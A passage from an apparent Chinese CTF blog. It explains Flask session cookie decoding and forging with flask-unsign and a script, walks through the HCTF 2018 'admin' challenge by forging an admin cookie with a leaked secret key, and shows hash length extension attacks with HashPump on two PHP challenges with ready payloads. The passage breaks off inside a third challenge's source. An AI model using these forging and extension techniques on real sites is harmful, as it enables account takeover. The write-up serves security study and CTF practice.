string">'username'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#删除session</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/delete/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'delete'</span><span class="token comment" spellcheck="true">#清楚session</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/clear/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'clear'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>我们运行/,然后get请求后获得</p><p><img src="1.png" alt="img"></p><p>获得session为</p><pre><code>eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y</code></pre><h3 id="四、session安全问题"><a href="#四、session安全问题" class="headerlink" title="四、session安全问题"></a>四、session安全问题</h3><p>其实生成上面的session居然是可以破解的！！！但是没有SECRET_KEY我们无法伪造，可以选择爆破但是一定要拿到SECRET_KEY才能伪造</p><h4 id="方法1：使用flask-unsign工具"><a href="#方法1：使用flask-unsign工具" class="headerlink" title="方法1：使用flask-unsign工具"></a>方法1：使用<a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">flask-unsign</a>工具</h4><p>安装<br><code>$ pip3 install flask-unsign</code><br>命令行就可以直接使用<code>$ flask-unsign</code></p><pre><code>C:\Users\38138\Desktop&gt;flask-unsign --sign --cookie &quot;{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;st4ck&#39;}&quot; --secret &quot;admin&quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4C:\Users\38138\Desktop&gt;flask-unsign --decode --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4&quot;{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;st4ck&#39;}</code></pre><h4 id="方法2：使用脚本"><a href="#方法2：使用脚本" class="headerlink" title="方法2：使用脚本"></a>方法2：使用脚本</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">import</span> ast<span class="token comment" spellcheck="true"># Abstract Base Classes (PEP 3119)</span><span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># &lt; 3.0</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Must be using at least Python 3'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">and</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># >= 3.0 &amp;&amp; &lt; 3.4</span>    <span class="token keyword">from</span> abc <span class="token keyword">import</span> ABCMeta<span class="token punctuation">,</span> abstractmethod<span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># > 3.4</span>    <span class="token keyword">from</span> abc <span class="token keyword">import</span> ABC<span class="token punctuation">,</span> abstractmethod<span class="token comment" spellcheck="true"># Lib for argument parsing</span><span class="token keyword">import</span> argparse<span class="token comment" spellcheck="true"># external Imports</span><span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">and</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># >= 3.0 &amp;&amp; &lt; 3.4</span>    <span class="token keyword">class</span> <span class="token class-name">FSCM</span><span class="token punctuation">(</span>metaclass<span class="token operator">=</span>ABCMeta<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Encode a Flask session cookie """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                session_cookie_structure <span class="token operator">=</span> dict<span class="token punctuation">(</span>ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">)</span>                si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Encoding error] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e        <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Decode a Flask cookie  """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>secret_key<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>                    compressed <span class="token operator">=</span> <span class="token boolean">False</span>                    payload <span class="token operator">=</span> session_cookie_value                    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        compressed <span class="token operator">=</span> <span class="token boolean">True</span>                        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">if</span> compressed<span class="token punctuation">:</span>                        data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">return</span> data                <span class="token keyword">else</span><span class="token punctuation">:</span>                    app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                    si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                    s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                    <span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Decoding error] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e<span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># > 3.4</span>    <span class="token keyword">class</span> <span class="token class-name">FSCM</span><span class="token punctuation">(</span>ABC<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Encode a Flask session cookie """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                session_cookie_structure <span class="token operator">=</span> dict<span class="token punctuation">(</span>ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">)</span>                si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Encoding error] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e        <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Decode a Flask cookie  """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>secret_key<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>                    compressed <span class="token operator">=</span> <span class="token boolean">False</span>                    payload <span class="token operator">=</span> session_cookie_value                    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        compressed <span class="token operator">=</span> <span class="token boolean">True</span>                        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">if</span> compressed<span class="token punctuation">:</span>                        data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">return</span> data                <span class="token keyword">else</span><span class="token punctuation">:</span>                    app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                    si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                    s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                    <span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Decoding error] {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>FSCM<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="2.png" alt="img"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>flask session 加解密工具：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a><br>SECRET_KEY 爆破工具:<a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></p><h3 id="五、-HCTF-2018-admin"><a href="#五、-HCTF-2018-admin" class="headerlink" title="五、[HCTF 2018]admin"></a>五、[HCTF 2018]admin</h3><p>有一个注册界面</p><p><img src="4.png" alt="img"></p><p>我们注册一个</p><pre><code>st4ck</code></pre><pre><code>123qwe</code></pre><p>的账号，然后session解密</p><pre class=" language-python"><code class="language-python">C<span class="token punctuation">:</span>\Users\<span class="token number">38138</span>\Desktop<span class="token operator">></span>flask<span class="token operator">-</span>unsign <span class="token operator">-</span><span class="token operator">-</span>decode <span class="token operator">-</span><span class="token operator">-</span>cookie <span class="token string">".eJw9kEGLwjAQhf_KkrOHNtaL4GGX1mBhJlRSQ-Yibq22iXGhVagR__sGF_YwpzfvmzfvyfanoR07trwN93bG9v2RLZ_s45stGaiaS00dCfMgv-viOLKlB2-C1NVE-WZOAjIpSkd5aY1eXyBsFlIXKYqdx5wcKbRkPzOpHCfVpKQ2E-RowRcLE1wGAeZojz3wnUNecxPvyBwSFOtOiopL1cQMdQIaHSo3kS57UFsHNu5Y7I0vONpqxV4z1ozDaX_7ce31_wUUeCFLF1TnCfMqWiCR6uhRw0Sq7CA0D7ImRoBA6stjKFKqVm9c7w_n9p_Urrdlff5TrgcfBTbessaxGbuP7fDujaUJe_0C4HFsfw.Xbn_9Q.LN7SQgH0-wJ_7nD5E8h8KRKXEKM"</span><span class="token punctuation">{</span><span class="token string">'_fresh'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'_id'</span><span class="token punctuation">:</span> b<span class="token string">'1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664'</span><span class="token punctuation">,</span> <span class="token string">'csrf_token'</span><span class="token punctuation">:</span> b<span class="token string">'4cef6e58144463497f5c1e2a372f67633e0f715e'</span><span class="token punctuation">,</span> <span class="token string">'image'</span><span class="token punctuation">:</span> b<span class="token string">'xTIR'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'st4ck'</span><span class="token punctuation">,</span> <span class="token string">'user_id'</span><span class="token punctuation">:</span> <span class="token string">'10'</span><span class="token punctuation">}</span></code></pre><p>在修改密码的地方获得github地址<br><code>https://github.com/woadsl1234/hctf_flask/</code><br>在config.py里获得<code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code><br>于是我们拿着ckj123来伪造</p><pre class=" language-python"><code class="language-python">C<span class="token punctuation">:</span>\Users\<span class="token number">38138</span>\Desktop<span class="token operator">></span>flask<span class="token operator">-</span>unsign <span class="token operator">-</span><span class="token operator">-</span>sign <span class="token operator">-</span><span class="token operator">-</span>cookie <span class="token string">"{'_fresh': True, '_id': b'1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664', 'csrf_token': b'4cef6e58144463497f5c1e2a372f67633e0f715e', 'image': b'xTIR', 'name': 'admin', 'user_id': '10'}"</span> <span class="token operator">-</span><span class="token operator">-</span>secret <span class="token string">"ckj123"</span><span class="token punctuation">.</span>eJw9kEGLwjAQhf_KkrOHNupF8LBLa7AwEyqpIXMRbattYlyoCjXif9_ggoc5vXnfvHlPtjsO7bVji9twbyds1zds8WRfB7ZgoCouNXUkzIP8tovjyBYevAlSlyNl6ykJmElROMoKa_TqDGE9lzpPUWw9ZuRIoSX7PZPKcVJ1Smo9QoYWfD43wc0gwBRt0wPfOuQVN_GOzCBBseqkKLlUdcxQJaDRoXIj6aIHtXFg447F3vicoy2X7DVh9XU47m6_rr18XkCBZ7J0RnUaMSujBRKpGo8aRlJFB6F<span class="token operator">-</span>kDUxAgRSPx5DnlK5fON6vz<span class="token operator">-</span>1H1K72hTV6V<span class="token operator">-</span>57H0U2L7x_YVN2P3aDu_eWJqw1x_isWyf<span class="token punctuation">.</span>XboBVw<span class="token punctuation">.</span>SUcm9Kffci1R5O3u9w<span class="token operator">-</span>lcq21QMo</code></pre><p>在浏览器修改cookie中的session值后直接就拿到了flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希长度扩展攻击以及HashPump安装使用和两道题目</title>
      <link href="/2019/11/19/ha-xi-chang-du-kuo-zhan-gong-ji-yi-ji-hashpump-an-zhuang-shi-yong-he-liang-dao-ti-mu/"/>
      <url>/2019/11/19/ha-xi-chang-du-kuo-zhan-gong-ji-yi-ji-hashpump-an-zhuang-shi-yong-he-liang-dao-ti-mu/</url>
      
        <content type="html"><![CDATA[<h3 id="能做什么"><a href="#能做什么" class="headerlink" title="能做什么"></a>能做什么</h3><p>如果salt的值你不知道，但是你知道长度，又知道sha1(salt)，那么就也就可以知道sha1(salt+“填充数据”+“任意可控数据”).这里的salt+“填充数据”就是对salt进行sha1时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果salt的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于N个分组。<br>为什么？你可以想象，sha1程序再对（salt+“填充数据”+“任意可控数据”）进行hash时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的registers值就是sha1(salt)的值，该值你已经知道了。</p><p>你把下面的例子中的<code>“1234567890abcdeadminadmin”</code>,<code>&quot;memeadmin&quot;</code>想成是salt,然后再考虑下呢？</p><h3 id="HashPump安装"><a href="#HashPump安装" class="headerlink" title="HashPump安装"></a>HashPump安装</h3><pre class=" language-shell"><code class="language-shell">git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install</code></pre><p>在执行make的时候可能会出现openssl/sha.h没有文件的错误<br>那么</p><pre><code>sudo apt-get install opensslsudo apt-get install libssl-dev</code></pre><p>然后make 和make install即可<br>使用：</p><pre class=" language-bash"><code class="language-bash">kitty@ubuntu:~/桌面/HashPump$ hashpumpInput Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 4Input Data to Add: joychou 06cf5a94dcda53659f58c0f411ba0bd8admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00joychou</code></pre><p>参数说明</p><pre><code>signature来自已知消息的签名。data来自已知消息的数据。additional您要添加到已知消息的信息。keylength 用于对原始消息进行签名的密钥的长度（以字节为单位）。是除去一个admin的长度（具体看题）</code></pre><p>得到的第一行是新的hash值 第二行是payload<br>或者用python包</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>其中<code>$salt = &quot;meme&quot;;</code>玩家不可见，计算不能用</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$role</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"hash"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">"meme"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hash</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$role</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'wrong!'</span><span class="token punctuation">;</span>         exit<span class="token punctuation">;</span><span class="token punctuation">}</span>x<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$role</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'wrong, hash cann\'t be admin'</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"You are "</span><span class="token punctuation">.</span><span class="token variable">$role</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'Congradulation!'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9</span><span class="token delimiter">?></span></code></pre><p>首先计算</p><pre><code>kitty@ubuntu:~/桌面$ hashpumpInput Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 4Input Data to Add: st4ck92910845adf673d71ca809b196bcab9eadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00st4ck</code></pre><p>编码</p><pre><code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck</code></pre><p>然后传参，由于没有urldecode，所以要最好用get,因为get请求自带urldecode</p><pre><code>http://localhost/index.php?role=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00st4ck内容：hash=92910845adf673d71ca809b196bcab9e</code></pre><p><img src="2.png" alt="img"></p><h4 id="题目2-实验吧-为了方便改了一下本地测试"><a href="#题目2-实验吧-为了方便改了一下本地测试" class="headerlink" title="题目2-实验吧-为了方便改了一下本地测试"></a>题目2-实验吧-为了方便改了一下本地测试</h4><p>其中<code>$secret=&quot;1234567890abcde&quot;;</code>给玩家不可见，计算也不能使用这个数据，这里展示出来只是为了本地操作</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$secret</span><span class="token operator">=</span><span class="token string">"1234567890abcde"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// This secret is 15 characters long for security!</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"flag{test}"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token punctuation">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Congratulations! You are a registered user.\n&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"The flag is "</span><span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// md5(1234567890abcdeadminadmin)=93a5e7bea9c040065617b1a62ffc3d72</span><span class="token delimiter">?></span></code></pre><p>题目中能得到信息</p><pre class=" language-python"><code class="language-python">md5<span class="token punctuation">(</span>$secret<span class="token punctuation">.</span><span class="token string">"adminadmin"</span><span class="token punctuation">)</span>的值为<span class="token number">93a5e7bea9c040065617b1a62ffc3d72</span></code></pre><p>稍微整理下我们已经知道的</p><pre><code>$secret是密文，长度为15，如果再算上后面第一个admin，长度就是20而数据是admin签名（哈希值）是93a5e7bea9c040065617b1a62ffc3d72</code></pre><p>第一步计算payload</p><pre class=" language-bash"><code class="language-bash">kitty@ubuntu:~/桌面$ hashpumpInput Signature: 93a5e7bea9c040065617b1a62ffc3d72Input Data: adminInput Key Length: 20Input Data to Add: st4ckbf3722a5e102e94a83adef7cbf34a30badmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00st4ck</code></pre><p>换一下编码</p><pre><code>password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00st4ck&amp;getmein=bf3722a5e102e94a83adef7cbf34a30b</code></pre><p>由于自带urldecode，所以可以直接使用·</p><p><img src="1.png" alt="img"></p><h4 id="题目3-哈希长度拓展攻击之De1CTF-SSRF-Me"><a href="#题目3-哈希长度拓展攻击之De1CTF-SSRF-Me" class="headerlink" title="题目3-哈希长度拓展攻击之De1CTF - SSRF Me"></a>题目3-哈希长度拓展攻击之De1CTF - SSRF Me</h4><p>给出了源码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> jsonreload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token 